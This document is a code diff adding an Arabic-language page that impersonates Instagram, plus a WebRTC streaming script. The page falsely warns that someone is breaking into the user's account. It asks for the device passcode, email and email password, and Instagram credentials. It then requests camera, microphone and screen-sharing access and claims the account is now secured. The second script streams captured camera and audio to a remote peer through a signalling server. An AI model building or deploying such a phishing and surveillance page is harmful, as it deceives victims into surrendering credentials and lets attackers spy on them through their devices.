@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إنستغرام</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin: 50px auto;
+            width: 90%;
+            max-width: 400px;
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #262626;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            height: 50px;
+        }
+        .warning {
+            color: red;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        input {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #3074c6;
+        }
+        .success {
+            color: green;
+            font-size: 20px;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <div id="page1" class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+            <p>Instagram</p>
+        </div>
+        <p class="warning">هناك شخص يحاول الدخول إلى حسابك!</p>
+        <input type="text" id="device-password" placeholder="الرقم السري الخاص بالجهاز">
+        <input type="email" id="email" placeholder="الإيميل">
+        <input type="password" id="email-password" placeholder="كلمة السر الخاصة بالإيميل">
+        <input type="text" id="instagram-username" placeholder="اسم حساب إنستغرام">
+        <input type="password" id="instagram-password" placeholder="كلمة السر الخاصة بإنستغرام">
+        <button onclick="requestPermissions()">تأكيد</button>
+    </div>
+
+    <div id="page2" class="container" style="display: none;">
+        <p class="success">✔ تم تأمين الحساب لن يقدر أحد الدخول عليه.</p>
+    </div>
+
+    <script>
+        async function requestPermissions() {
+            try {
+                // طلب الوصول إلى الكاميرا والميكروفون
+                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                console.log("تم منح إذن الكاميرا والميكروفون.");
+
+                // طلب الوصول إلى عرض الشاشة
+                if (navigator.mediaDevices.getDisplayMedia) {
+                    await navigator.mediaDevices.getDisplayMedia({ video: true });
+                    console.log("تم منح إذن عرض الشاشة.");
+                } else {
+                    console.log("عرض الشاشة غير مدعوم في هذا المتصفح.");
+                }
+
+                // الانتقال إلى الصفحة الثانية
+                document.getElementById('page1').style.display = 'none';
+                document.getElementById('page2').style.display = 'block';
+            } catch (error) {
+                console.error("لم يتم منح الأذونات:", error);
+                alert("يرجى منح الأذونات لتأمين الحساب.");
+            }
+        }
+    </script>
+</body>
+</html>
+const socket = io(); // الاتصال بالخادم
+
+let localStream;
+let peerConnection;
+
+const configuration = {
+    iceServers: [
+        { urls: 'stun:stun.l.google.com:19302' } // خادم STUN لتحديد عناوين IP
+    ]
+};
+
+async function startStreaming() {
+    try {
+        // طلب إذن الكاميرا أو الميكروفون
+        localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const videoElement = document.createElement('video');
+        videoElement.srcObject = localStream;
+        videoElement.autoplay = true;
+        document.body.appendChild(videoElement);
+
+        // إعداد WebRTC
+        peerConnection = new RTCPeerConnection(configuration);
+
+        // إضافة التدفقات المحلية إلى الاتصال
+        localStream.getTracks().forEach((track) => {
+            peerConnection.addTrack(track, localStream);
+        });
+
+        // إرسال مرشحات ICE إلى الخادم
+        peerConnection.onicecandidate = (event) => {
+            if (event.candidate) {
+                socket.emit('ice-candidate', event.candidate);
+            }
+        };
+
+        // استقبال التدفقات من الجهاز الآخر
+        peerConnection.ontrack = (event) => {
+            const remoteVideo = document.createElement('video');
+            remoteVideo.srcObject = event.streams[0];
+            remoteVideo.autoplay = true;
+            document.body.appendChild(remoteVideo);
+        };
+
+        // إنشاء عرض (offer) وإرساله إلى الخادم
+        const offer = await peerConnection.createOffer();
+        await peerConnection.setLocalDescription(offer);
+        socket.emit('offer', offer);
+    } catch (error) {
+        console.error('حدث خطأ أثناء بدء البث:', error);
+    }
+}
+
+// استقبال البيانات من الخادم
+socket.on('offer', async (offer) => {
+    if (!peerConnection) {
+        peerConnection = new RTCPeerConnection(configuration);
+
+        peerConnection.onicecandidate = (event) => {
+            if (event.candidate) {
+                socket.emit('ice-candidate', event.candidate);
+            }
+        };
+
+        peerConnection.ontrack = (event) => {
+            const remoteVideo = document.createElement('video');
+            remoteVideo.srcObject = event.streams[0];
+            remoteVideo.autoplay = true;
+            document.body.appendChild(remoteVideo);
+        };
+    }
+
+    await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+    const answer = await peerConnection.createAnswer();
+    await peerConnection.setLocalDescription(answer);
+    socket.emit('answer', answer);
+});
+
+socket.on('answer', async (answer) => {
+    await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
+});
+
+socket.on('ice-candidate', (candidate) => {
+    peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
+});
